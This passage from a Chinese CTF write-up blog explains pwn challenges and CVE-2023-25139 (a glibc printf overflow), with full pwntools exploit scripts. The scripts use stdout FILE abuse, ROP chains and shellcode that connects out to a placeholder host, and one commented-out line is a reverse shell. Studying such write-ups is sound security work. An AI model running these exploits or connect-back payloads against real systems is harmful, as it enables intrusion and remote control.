class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;122.9.149.82&#x27;, 9999)</span></span><br><span class="line">p = process(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /init\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line">    rand = process(<span class="string">&#x27;get_rand&#x27;</span>)</span><br><span class="line">    value = rand.recv(<span class="number">13</span>)</span><br><span class="line">    rand.close()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setlocal</span>(<span class="params">data, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /setlocale?&#x27;</span> + data + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">name, pawd, uid, size, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /register?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;&amp;uid=&#x27;</span> + <span class="built_in">str</span>(uid) + <span class="string">&#x27;&amp;len=&#x27;</span> + <span class="built_in">str</span>(size) + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">data</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /test&#x27;</span> + data + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logoff</span>(<span class="params">name, pawd, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /logoff?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name, pawd, fd</span>):</span><br><span class="line">    pl = <span class="string">&#x27;GET /show?&#x27;</span> + <span class="string">&#x27;username=&#x27;</span> + name + <span class="string">&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, pawd, size, data, fd</span>):</span><br><span class="line">    pl = <span class="string">b&#x27;POST /note?&#x27;</span> + <span class="string">b&#x27;username=&#x27;</span> + name + <span class="string">b&#x27;&amp;password=&#x27;</span> + pawd + <span class="string">b&#x27;\nContent-Length: &#x27;</span> + <span class="built_in">str</span>(size).encode() + <span class="string">b&#x27;\nStdout: &#x27;</span> + <span class="built_in">str</span>(fd).encode() + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    s(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_</span>():</span><br><span class="line">    pl = <span class="string">&#x27;GET /poweroff\n&#x27;</span></span><br><span class="line">    sl(pl)</span><br><span class="line"></span><br><span class="line">pas1 = init(<span class="number">3</span>)</span><br><span class="line">logoff(<span class="string">&#x27;root&#x27;</span>, pas1.decode(), <span class="number">3</span>)<span class="comment">#放入unsorted以此泄露</span></span><br><span class="line">pas1 = init(<span class="number">3</span>)</span><br><span class="line">show(<span class="string">&#x27;root&#x27;</span>, pas1.decode(), <span class="number">1</span>)</span><br><span class="line">libc_base = l64() - <span class="number">0x1f6ce0</span></span><br><span class="line"></span><br><span class="line">reg(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">reg(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">logoff(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">setlocal(<span class="string">&#x27;=&#x27;</span> + <span class="string">&#x27;en_US.UTF-8&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)\nb *$rebase(0x34f3)\n&#x27;)</span></span><br><span class="line">reg(<span class="string">&#x27;a:b:0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x10</span>, <span class="number">3</span>)</span><br><span class="line">reg(<span class="string">&#x27;c:c:0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x3e8</span>, <span class="number">0x400</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">system, binsh = get_sb()</span><br><span class="line">_IO_wfile_jumps = libc_base + <span class="number">0x1f3240</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line"></span><br><span class="line">pl = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">b&#x27;a:b:0&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(environ) <span class="comment">#+ p64(0x400)</span></span><br><span class="line">edit(<span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x1a32)&#x27;)</span></span><br><span class="line"></span><br><span class="line">show(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">stack = l64()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line">pl = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a:b:0&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(stack - <span class="number">0xca0</span>) + p64(<span class="number">0x400</span>)</span><br><span class="line">edit(<span class="string">b&#x27;c&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)\nb *$rebase(0x34f3)\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">rdi = libc_base + <span class="number">0x240e5</span></span><br><span class="line">rsi = libc_base + <span class="number">0x2573e</span></span><br><span class="line">rdx = libc_base + <span class="number">0x26302</span></span><br><span class="line">rax = libc_base + <span class="number">0x40123</span></span><br><span class="line">ret = libc_base + <span class="number">0x23159</span></span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#pl = p64(ret) + p64(rdi) + p64(stack - 0xca0 + 0x20) + p64(system)</span></span><br><span class="line"><span class="comment">#pl += b&#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment">#pl += b&#x27;/bin/sh -i &gt;&amp; /dev/tcp/x/x 0&gt;&amp;1\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *$rebase(0x357c)&#x27;)</span></span><br><span class="line">pl = p64(rdi) + p64((stack &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">16</span>) + p64(rsi) + p64(<span class="number">0x10000</span>) + p64(rdx) + p64(<span class="number">0x7</span>)</span><br><span class="line">pl += p64(mprotect) + p64(stack - <span class="number">0xca0</span> + <span class="number">0x40</span>)</span><br><span class="line">pl += asm(shellcraft.connect(<span class="string">&#x27;xx.xx.xx.xx.xx&#x27;</span>, xx) + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="number">2</span>, stack + <span class="number">0x1000</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, stack + <span class="number">0x1000</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>, <span class="built_in">len</span>(pl), pl, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line">lg(<span class="string">&#x27;stdout&#x27;</span>, stdout)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h2 id="CVE-2023-25139"><a href="#CVE-2023-25139" class="headerlink" title="CVE-2023-25139"></a>CVE-2023-25139</h2><p>原文链接:</p><p><a href="https://sourceware.org/bugzilla/show_bug.cgi?id=30068">30068 – (CVE-2023-25139) incorrect printf output for integers with thousands separator and width field (CVE-2023-25139) (sourceware.org)</a></p><p>这个cve原理很简单</p><p>在glibc2.37的某些版本,例如Ubuntu GLIBC 2.37-0ubuntu1(<u>Ubuntu GLIBC 2.37-0ubuntu2就修复了</u>)</p><p>当调用<a href="`setlocale` 函数安装指定的系统本地环境或其一部分，作为新的 C 本地环境。修改保持效果，并影响所有关乎本地环境的 C 库函数执行，到下次调用 `setlocale` 为止。若 `locale` 为空指针，则 `setlocale` 查询当前 C 本地环境而不修改它。">setlocale函数</a></p><p>如果设置LC_NUMERIC或LC_ALL为一个含有千位分割符的地区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_CTYPE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_NUMERIC 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_TIME 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_COLLATE 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MONETARY 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MESSAGES 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_ALL 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_PAPER 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_NAME 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_ADDRESS 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_TELEPHONE10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_MEASUREMENT11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __LC_IDENTIFICATION12</span></span><br></pre></td></tr></table></figure><p>例如”en_US.UTF-8”</p><p>然后在使用格式化字符串时,如果有<strong>“%-‘nd”</strong>,即使用数字分隔符左对齐n个字符位格式化一个整型</p><p>那么整型有几个千位分隔符,格式化的结果就会多出几位</p><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="built_in">strlen</span> (<span class="string">&quot;1234567890123:&quot;</span>) + <span class="number">1</span>];</span><br><span class="line">  __builtin_memset (buf, <span class="string">&#x27;x&#x27;</span>, <span class="keyword">sizeof</span> (buf));</span><br><span class="line">  <span class="keyword">if</span> (setlocale (<span class="number">6</span>, <span class="string">&quot;en_US.UTF-8&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;1234567890123:\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;%-&#x27;13ld:\n&quot;</span>, <span class="number">1234567999L</span>);</span><br><span class="line">      <span class="built_in">sprintf</span> (buf, <span class="string">&quot;%0+ -&#x27;13ld:&quot;</span>, <span class="number">1234567L</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span> (<span class="string">&quot;1234567890123:&quot;</span>) + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;%c&quot;</span>, buf[i]);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="built_in">printf</span> (<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output,两个千位分隔符所以多出两个字符位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1234567890123:</span><br><span class="line">+1,234,567     :</span><br><span class="line">+1,234,567     </span><br></pre></td></tr></table></figure><p>因此如果sprintf使用这个格式化字符串,就有可能会造成缓冲区溢出</p><p>特别是缓冲区大小刚好的时候,因为sprintf会在拼接的格式化字符串后面置’\0’</p><h2 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h2><p>当随机数函数的种子是由rand(time(0))生成的</p><p>time(0)精确到秒,是可以被预测</p><p>所以只要在本地同一时间运行一个相同的获得随机数代码</p><p>那么我们就可以预测到生成的随机数</p><h1 id="2023tctf-c00ledit"><a href="#2023tctf-c00ledit" class="headerlink" title="2023tctf-c00ledit"></a>2023tctf-c00ledit</h1><p><strong>标签:stdout泄露libc|有符号溢出|ROP</strong></p><p><strong>题目介绍:</strong>Try the “edit” feature.</p><p>程序只提供了两个功能</p><p><strong>add</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1354</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r12d</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v4 = num_dword_40E4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)num_dword_40E4 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enough!&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  ptr_qword_4060[v4] = v6;</span><br><span class="line">  *v6 = <span class="number">4096LL</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Current node: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">  ++num_dword_40E4;</span><br><span class="line">  <span class="keyword">return</span> a4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一次add item,会分配一个0x10chunk,用于记载大小和指针</p><p><strong>edit</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 idx; <span class="comment">// rbp</span></span><br><span class="line">  __int64 offset; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="string">&quot;No chance!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( edittime_dword_40E0 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v0 = <span class="string">&quot;Invalid index!&quot;</span>;</span><br><span class="line">  idx = readnum();</span><br><span class="line">  <span class="keyword">if</span> ( !ptr_qword_4060[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  offset = readnum();</span><br><span class="line">  <span class="keyword">if</span> ( offset + <span class="number">7</span> &gt;= *(_QWORD *)ptr_qword_4060[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Invalid offset!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, (<span class="type">void</span> *)(*(_QWORD *)(ptr_qword_4060[idx] + <span class="number">8LL</span>) + offset), <span class="number">8uLL</span>);<span class="comment">// vuln</span></span><br><span class="line">  ++edittime_dword_40E0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit时,能够自己指定edit的item和修改的偏移起始</p><p>程序没有输出item内容的功能</p><p>存在的漏洞点是,edit读入的下标索引的类型是有符号数,转化数字使用的是atol,也就是说没有对负数进行检测</p><p>因此如果item下标索引输入负数,就能够通过bss段上的stdout等指针修改对应的FILE结构体</p><p>又因为程序存在进入io链的输出函数,所以我们自然能够想到利用stdout泄露libc</p><p>通过IO_FILE的知识可以知道,当满足一些条件时能够输出__IO_write_base至__IO_write_ptr之间的内容</p><p>因此可以修改__IO_write_ptr指针</p><p>不过我们需要先对stdout的flag进行一些修改</p><p>它的flag&amp;_IO_CURRENTLY_PUTTING标志位应该为1,IO_NO_WRITES为0,其他另行判断</p><p>确保IO_OVERFLOW不会修改我们写入的IO_write_ptr</p><p>以此泄露出libc</p><p>再之后,官方题解是利用_IO_obstack_jumps这个vtable表</p><p>还有一些选手是利用修改libc.so的got.plt</p><p>不过我选择的是再次利用stdout泄露environ,打rop</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(cintent)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,content</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">sla(<span class="string">b&#x27;Offset: &#x27;</span>,tbs(offset))</span><br><span class="line">sa(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.231.174.57&#x27;,10101)</span></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">131</span>,p32(<span class="number">0xfbad0800</span>))</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,<span class="string">b&#x27;\x20&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">5</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f0</span>-<span class="number">2205568</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,p64(libc.sym[<span class="string">&#x27;__environ&#x27;</span>]+<span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv(0x9f0+13)</span></span><br><span class="line">p.recv(<span class="number">0xa03</span>)</span><br><span class="line"></span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,-<span class="number">24</span>,p64(stack-<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,p64(libc.address+<span class="number">0x2a3e6</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,p64(libc.address+<span class="number">0x2a3e5</span>))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>遇到使用索引却没有检测正负的都要当心</p><h1 id="2023tctf-无中生有"><a href="#2023tctf-无中生有" class="headerlink" title="2023tctf-无中生有"></a>2023tctf-无中生有</h1><p><strong>标签:elf|vdso|可执行栈</strong></p><p><strong>题目介绍:</strong></p><p>题目的意思很明确,让选手自己构建一个ELF上传到靶机运行</p><p>不过对ELF有不少要求</p><ol><li>大小有限制</li><li>必须是静态链接</li><li>不能有syscall和int 80h</li><li>每个段不能同时有写和执行的权限</li></ol><p>此外,启动ELF时还有继承的沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span 